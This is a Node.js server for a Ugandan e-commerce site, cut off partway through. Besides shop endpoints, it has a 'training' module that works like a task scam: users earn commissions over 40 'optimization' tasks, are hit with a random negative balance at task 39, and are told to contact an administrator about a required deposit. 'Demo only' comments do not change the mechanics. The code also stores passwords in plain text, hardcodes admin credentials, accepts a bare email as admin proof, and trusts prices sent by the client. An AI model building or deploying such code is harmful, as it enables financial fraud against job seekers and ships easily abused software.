const http = require("http");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const { URL } = require("url");

const PORT = process.env.PORT || 3000;
const ROOT = __dirname;
const DATA = path.join(ROOT, "data");
const DB = path.join(DATA, "db.json");

if (!fs.existsSync(DATA)) {
  fs.mkdirSync(DATA, { recursive: true });
}

const trainingProducts = [
  "Bluetooth Speaker",
  "Phone Charger",
  "Solar Lamp",
  "Wireless Earbuds",
  "Smart Watch",
  "LED Bulb",
  "Power Bank",
  "USB Cable",
  "Electric Kettle",
  "Phone Holder",
  "Mini Fan",
  "Smart TV",
  "Laptop Stand",
  "Security Camera",
  "Bluetooth Headphones",
  "Ring Light",
  "Extension Cable",
  "Solar Panel",
  "Table Lamp",
  "Electric Iron",
  "Keyboard",
  "Computer Mouse",
  "Memory Card",
  "WiFi Router",
  "Projector",
  "Smartphone",
  "Microphone",
  "Tripod",
  "Gaming Controller",
  "LED Strip",
  "Hair Dryer",
  "Blender",
  "Electric Cooker",
  "Power Inverter",
  "Rechargeable Fan",
  "Vacuum Cleaner",
  "Digital Scale",
  "Air Cooler",
  "Smart Doorbell",
  "Smart TV Accessory"
];

const seed = {
  users: [
    {
      id: "u_admin",
      name: "MyMarket Admin",
      email: "admin@mymarket.ug",
      password: "admin123",
      role: "admin"
    },
    {
      id: "u_seller",
      name: "Demo Electronics",
      email: "seller@mymarket.ug",
      password: "seller123",
      role: "seller",
      shop: "Demo Electronics Uganda"
    }
  ],

  products: [
    {
      id: "p1",
      name: "Samsung Galaxy A15",
      category: "Phones",
      price: 699000,
      stock: 12,
      sellerId: "u_seller",
      image: "📱",
      active: true
    },
    {
      id: "p2",
      name: "Solar Home Kit 100W",
      category: "Solar",
      price: 320000,
      stock: 20,
      sellerId: "u_seller",
      image: "☀️",
      active: true
    },
    {
      id: "p3",
      name: "Bluetooth Speaker",
      category: "Electronics",
      price: 85000,
      stock: 30,
      sellerId: "u_seller",
      image: "🔊",
      active: true
    },
    {
      id: "p4",
      name: "Men's Sneakers",
      category: "Fashion",
      price: 120000,
      stock: 18,
      sellerId: "u_seller",
      image: "👟",
      active: true
    }
  ],

  orders: [],

  training: {
    startingBalance: 0,
    totalTasks: 40,
    negativeTask: 39,
    maxDeposit: 30000,
    commissionPerTask: 2500,
    products: trainingProducts
  },

  trainingUsers: []
};

if (!fs.existsSync(DB)) {
  fs.writeFileSync(
    DB,
    JSON.stringify(seed, null, 2)
  );
}

function readDB() {
  const db = JSON.parse(
    fs.readFileSync(DB, "utf8")
  );

  if (!Array.isArray(db.users)) {
    db.users = [];
  }

  if (!Array.isArray(db.products)) {
    db.products = [];
  }

  if (!Array.isArray(db.orders)) {
    db.orders = [];
  }

  if (!Array.isArray(db.trainingUsers)) {
    db.trainingUsers = [];
  }

  if (!db.training) {
    db.training = {
      ...seed.training
    };
  }

  if (
    !Array.isArray(db.training.products) ||
    db.training.products.length !== 40
  ) {
    db.training.products = trainingProducts;
  }

  return db;
}

function writeDB(db) {
  fs.writeFileSync(
    DB,
    JSON.stringify(db, null, 2)
  );
}

function makeId(prefix) {
  return (
    prefix +
    "_" +
    crypto.randomBytes(5).toString("hex")
  );
}

function json(res, code, data) {
  const output = JSON.stringify(data);

  res.writeHead(code, {
    "Content-Type":
      "application/json; charset=utf-8",
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers":
      "Content-Type",
    "Access-Control-Allow-Methods":
      "GET,POST,PUT,OPTIONS"
  });

  res.end(output);
}

function getBody(req) {
  return new Promise((resolve, reject) => {
    let data = "";

    req.on("data", chunk => {
      data += chunk;
    });

    req.on("end", () => {
      if (!data) {
        resolve({});
        return;
      }

      try {
        resolve(JSON.parse(data));
      } catch (error) {
        reject(error);
      }
    });

    req.on("error", reject);
  });
}

function safeUser(user) {
  const {
    password,
    ...cleanUser
  } = user;

  return cleanUser;
}

function findAdmin(db, email) {
  const adminEmail =
    String(email || "")
      .trim()
      .toLowerCase();

  return db.users.find(
    user =>
      String(user.email || "")
        .toLowerCase() === adminEmail &&
      user.role === "admin"
  );
}

function getTrainingUser(db, userId) {
  let trainee =
    db.trainingUsers.find(
      user => user.userId === userId
    );

  if (!trainee) {
    trainee = {
      userId: userId,
      balance: 0,
      commission: 0,
      progress: 0,
      status: "active",
      negativeAmount: 0,
      depositRequired: 0,
      depositApproved: false,
      cycle: 1,
      completedCycles: 0
    };

    db.trainingUsers.push(trainee);
  }

  return trainee;
}

async function api(req, res, url) {

  if (req.method === "OPTIONS") {
    res.writeHead(204, {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers":
        "Content-Type",
      "Access-Control-Allow-Methods":
        "GET,POST,PUT,OPTIONS"
    });

    return res.end();
  }

  const db = readDB();

  /*
   PRODUCTS
  */

  if (
    req.method === "GET" &&
    url.pathname === "/api/products"
  ) {
    let products =
      db.products.filter(
        product =>
          product.active !== false
      );

    const search =
      (
        url.searchParams.get("q") || ""
      ).toLowerCase();

    const category =
      url.searchParams.get("category");

    if (search) {
      products =
        products.filter(product =>
          (
            product.name +
            " " +
            product.category
          )
            .toLowerCase()
            .includes(search)
        );
    }

    if (
      category &&
      category !== "All"
    ) {
      products =
        products.filter(
          product =>
            product.category === category
        );
    }

    return json(res, 200, {
      products
    });
  }

  /*
   CATEGORIES
  */

  if (
    req.method === "GET" &&
    url.pathname === "/api/categories"
  ) {
    return json(res, 200, {
      categories: [
        "Phones",
        "Electronics",
        "Solar",
        "Fashion",
        "Home",
        "Beauty",
        "Groceries"
      ]
    });
  }

  /*
   LOGIN
  */

  if (
    req.method === "POST" &&
    url.pathname === "/api/login"
  ) {
    const b = await getBody(req);

    const user =
      db.users.find(
        item =>
          String(item.email)
            .toLowerCase() ===
            String(b.email || "")
              .toLowerCase() &&
          item.password === b.password
      );

    if (!user) {
      return json(res, 401, {
        error:
          "Invalid email or password"
      });
    }

    return json(res, 200, {
      user: safeUser(user)
    });
  }

  /*
   REGISTER
  */

  if (
    req.method === "POST" &&
    url.pathname === "/api/register"
  ) {
    const b = await getBody(req);

    if (
      !b.name ||
      !b.email ||
      !b.password
    ) {
      return json(res, 400, {
        error:
          "Name, email and password are required"
      });
    }

    const exists =
      db.users.some(
        user =>
          String(user.email)
            .toLowerCase() ===
          String(b.email)
            .toLowerCase()
      );

    if (exists) {
      return json(res, 409, {
        error:
          "Email already exists"
      });
    }

    const user = {
      id: makeId("u"),
      name: b.name,
      email: b.email,
      password: b.password,
      role:
        b.role === "seller"
          ? "seller"
          : "customer",
      shop: b.shop || ""
    };

    db.users.push(user);

    writeDB(db);

    return json(res, 201, {
      user: safeUser(user)
    });
  }

  /*
   ORDERS
  */

  if (
    req.method === "POST" &&
    url.pathname === "/api/orders"
  ) {
    const b = await getBody(req);

    if (
      !Array.isArray(b.items) ||
      b.items.length === 0
    ) {
      return json(res, 400, {
        error: "Cart is empty"
      });
    }

    const total =
      b.items.reduce(
        (sum, item) =>
          sum +
          Number(item.price || 0) *
          Number(item.qty || 0),
        0
      );

    for (const item of b.items) {
      const product =
        db.products.find(
          p => p.id === item.id
        );

      if (
        !product ||
        product.stock <
          Number(item.qty || 0)
      ) {
        return json(res, 400, {
          error:
            `Insufficient stock for ${item.name}`
        });
      }
    }

    b.items.forEach(item => {
      const product =
        db.products.find(
          p => p.id === item.id
        );

      product.stock -=
        Number(item.qty || 0);
    });

    const order = {
      id: makeId("ord"),
      customerId:
        b.customerId || "guest",
      customerName:
        b.customerName || "Guest",
      phone: b.phone || "",
      address: b.address || "",
      items: b.items,
      total: total,
      status: "Pending",
      payment:
        b.payment ||
        "Cash on Delivery",
      createdAt:
        new Date().toISOString()
    };

    db.orders.unshift(order);

    writeDB(db);

    return json(res, 201, {
      order
    });
  }

  if (
    req.method === "GET" &&
    url.pathname === "/api/orders"
  ) {
    const role =
      url.searchParams.get("role");

    const userId =
      url.searchParams.get("userId");

    let orders = db.orders;

    if (role === "customer") {
      orders =
        orders.filter(
          order =>
            order.customerId === userId
        );
    }

    if (role === "seller") {
      const productIds =
        db.products
          .filter(
            product =>
              product.sellerId === userId
          )
          .map(product => product.id);

      orders =
        orders.filter(order =>
          order.items.some(item =>
            productIds.includes(
              item.id
            )
          )
        );
    }

    return json(res, 200, {
      orders
    });
  }

  /*
   ADD PRODUCT
  */

  if (
    req.method === "POST" &&
    url.pathname === "/api/products"
  ) {
    const b = await getBody(req);

    if (
      !b.name ||
      !b.price ||
      !b.sellerId
    ) {
      return json(res, 400, {
        error:
          "Product name, price and sellerId are required"
      });
    }

    const product = {
      id: makeId("p"),
      name: b.name,
      category:
        b.category || "Other",
      price: Number(b.price),
      stock:
        Number(b.stock || 0),
      sellerId: b.sellerId,
      image:
        b.image || "🛍️",
      active: true
    };

    db.products.push(product);

    writeDB(db);

    return json(res, 201, {
      product
    });
  }

  /*
   UPDATE ORDER
  */

  if (
    req.method === "PUT" &&
    url.pathname.startsWith(
      "/api/orders/"
    )
  ) {
    const orderId =
      url.pathname
        .split("/")
        .pop();

    const b = await getBody(req);

    const order =
      db.orders.find(
        item =>
          item.id === orderId
      );

    if (!order) {
      return json(res, 404, {
        error:
          "Order not found"
      });
    }

    if (b.status) {
      order.status =
        b.status;
    }

    writeDB(db);

    return json(res, 200, {
      order
    });
  }

  /*
   ADMIN STATS
  */

  if (
    req.method === "GET" &&
    url.pathname === "/api/admin/stats"
  ) {
    const revenue =
      db.orders.reduce(
        (sum, order) =>
          sum +
          Number(order.total || 0),
        0
      );

    return json(res, 200, {
      customers:
        db.users.filter(
          user =>
            user.role === "customer"
        ).length,

      sellers:
        db.users.filter(
          user =>
            user.role === "seller"
        ).length,

      products:
        db.products.length,

      orders:
        db.orders.length,

      revenue
    });
  }

  /*
   TRAINING SETTINGS - GET
  */

  if (
    req.method === "GET" &&
    url.pathname ===
      "/api/training/settings"
  ) {
    return json(res, 200, {
      training:
        db.training
    });
  }

  /*
   TRAINING SETTINGS - SAVE
  */

  if (
    req.method === "POST" &&
    url.pathname ===
      "/api/training/settings"
  ) {
    const b =
      await getBody(req);

    if (
      b.startingBalance !==
      undefined
    ) {
      db.training.startingBalance =
        Number(
          b.startingBalance
        );
    }

    if (
      b.totalTasks !==
      undefined
    ) {
      db.training.totalTasks =
        Number(
          b.totalTasks
        );
    }

    if (
      b.negativeTask !==
      undefined
    ) {
      db.training.negativeTask =
        Number(
          b.negativeTask
        );
    }

    if (
      b.maxDeposit !==
      undefined
    ) {
      db.training.maxDeposit =
        Number(
          b.maxDeposit
        );
    }

    if (
      b.commissionPerTask !==
      undefined
    ) {
      db.training.commissionPerTask =
        Number(
          b.commissionPerTask
        );
    }

    if (
      Array.isArray(b.products) &&
      b.products.length === 40
    ) {
      db.training.products =
        b.products;
    }

    writeDB(db);

    return json(res, 200, {
      message:
        "Training settings updated",
      training:
        db.training
    });
  }

  /*
   TRAINING STATE
  */

  if (
    req.method === "GET" &&
    url.pathname ===
      "/api/training/state"
  ) {
    const userId =
      url.searchParams.get(
        "userId"
      );

    if (!userId) {
      return json(res, 400, {
        error:
          "userId is required"
      });
    }

    const trainee =
      getTrainingUser(
        db,
        userId
      );

    writeDB(db);

    return json(res, 200, {
      training:
        trainee
    });
  }

  /*
   TRAINING OPTIMIZE
  */

  if (
    req.method === "POST" &&
    url.pathname ===
      "/api/training/optimize"
  ) {
    const b =
      await getBody(req);

    const userId =
      String(
        b.userId || ""
      );

    if (!userId) {
      return json(res, 400, {
        error:
          "userId is required"
      });
    }

    const trainee =
      getTrainingUser(
        db,
        userId
      );

    if (
      trainee.status ===
      "completed"
    ) {
      return json(res, 400, {
        error:
          "Cycle completed. Start a new cycle."
      });
    }

    if (
      trainee.status ===
      "waiting_admin"
    ) {
      return json(res, 400, {
        error:
          "Admin action required",
        depositRequired:
          trainee.depositRequired
      });
    }

    if (
      trainee.progress >= 40
    ) {
      return json(res, 400, {
        error:
          "Optimization already completed"
      });
    }

    trainee.progress++;

    const commission =
      Number(
        db.training
          .commissionPerTask ||
          2500
      );

    trainee.commission +=
      commission;

    trainee.balance +=
      commission;

    /*
      DEMO ONLY.

      At 39/40 the system may
      display a simulated negative
      event.

      No real payment is processed.
    */

    if (
      trainee.progress === 39
    ) {
      const negativeOptions = [
        5000,
        10000,
        20000,
        30000
      ];

      const negative =
        negativeOptions[
          Math.floor(
            Math.random() *
              negativeOptions.length
          )
        ];

      trainee.balance -=
        negative;

      trainee.negativeAmount =
        negative;

      trainee.depositRequired =
        negative;

      trainee.depositApproved =
        false;

      trainee.status =
        "waiting_admin";
    }

    if (
      trainee.progress === 40
    ) {
      trainee.status =
        "completed";

      trainee.completedCycles++;
    }

    writeDB(db);

    let message =
      "Optimization successful.";

    if (
      trainee.status ===
      "waiting_admin"
    ) {
      message =
        "Optimization paused. Please contact the administrator.";
    }

    if (
      trainee.status ===
      "completed"
    ) {
      message =
        "Optimization completed 40/40.";
    }

    return json(res, 200, {
      message,
      training:
        trainee
    });
  }

  /*
   TRAINING NEW CYCLE
  */

  if (
    req.method === "POST" &&
    url.pathname ===
      "/api/training/new-cycle"
  ) {
    const b =
      await getBody(req);

    const userId =
      String(
        b.userId || ""
      );

    if (!userId) {
      return json(res, 400, {
        error:
          "userId is required"
      });
    }

    const trainee =
      db.trainingUsers.find(
        user =>
          user.userId ===
          userId
      );

    if (!trainee) {
      return json(res, 404, {
        error:
          "Training record not found"
      });
    }

    if (
      trainee.status !==
      "completed"
    ) {
      return json(res, 400, {
        error:
          "The current cycle has not been completed."
      });
    }

    trainee.cycle++;

    trainee.balance = 0;
    trainee.commission = 0;
    trainee.progress = 0;
    trainee.status = "active";

    trainee.negativeAmount = 0;
    trainee.depositRequired = 0;
    trainee.depositApproved =
      false;

    writeDB(db);

    return json(res, 200, {
      message:
        "New demo cycle started from UGX 0.",
      training:
        trainee
    });
  }

  /*
   TRAINING ADMIN - VIEW TRAINEES
  */

  if (
    req.method === "GET" &&
    url.pathname ===
      "/api/training/admin-trainees"
  ) {
    const adminEmail =
      url.searchParams.get(
        "adminEmail"
      );

    const admin =
      findAdmin(
        db,
        adminEmail
      );

    if (!admin) {
      return json(res, 403, {
        error:
          "Administrator authorization required"
      });
    }

    return json(res, 200, {
      trainees:
        db.trainingUsers
    });
  }

  /*
   TRAINING ADMIN - CLEAR
  */

  if (
    req.method === "POST" &&
    url.pathname ===
      "/api/training/admin-clear"
  ) {
    const b =
      await getBody(req);

    const userId =
      String(
        b.userId || ""
      );

    const adminEmail =
      String(
        b.adminEmail || ""
      );

    const admin =
      findAdmin(
        db,
        adminEmail
      );

    if (!admin) {
      return json(res, 403, {
        error:
          "Administrator authorization required"
      });
    }

    if (!userId) {
      return json(res, 400, {
        error:
          "userId is required"
      });
    }

    const trainee =
      db.trainingUsers.find(
        user =>
          user.userId ===
          userId
      );

    if (!trainee) {
      return json(res, 404, {
        error:
          "Trainee training record not found"
      });
    }

    if (
      trainee.status !==
      "waiting_admin"
    ) {
      return json(res, 400, {
        error:
          "No admin action is currently required"
      });
    }

    const required =
      Number(
        trainee.depositRequired ||
          0
      );

    const maximum =
      Number(
        db.training.maxDeposit ||
          30000
      );

    if (
      required <= 0 ||
      required > maximum
    ) {
      return json(res, 400, {
        error:
          "Invalid demo requirement"
      });
    }

    /*
      DEMO ONLY.

      Admin clearance does not
      process real money.
    */

    const demoBalance =
      b.demoBalance !==
      undefined
        ? Number(
            b.demoBalance
          )
        : 50000;

    if (
      !Number.isFinite(
        demoBalance
      ) ||
      demoBalance < 0
    ) {
      return json(res, 400, {
        error:
          "Invalid demo balance"
      });
    }

    trainee.balance =
      demoBalance;

    
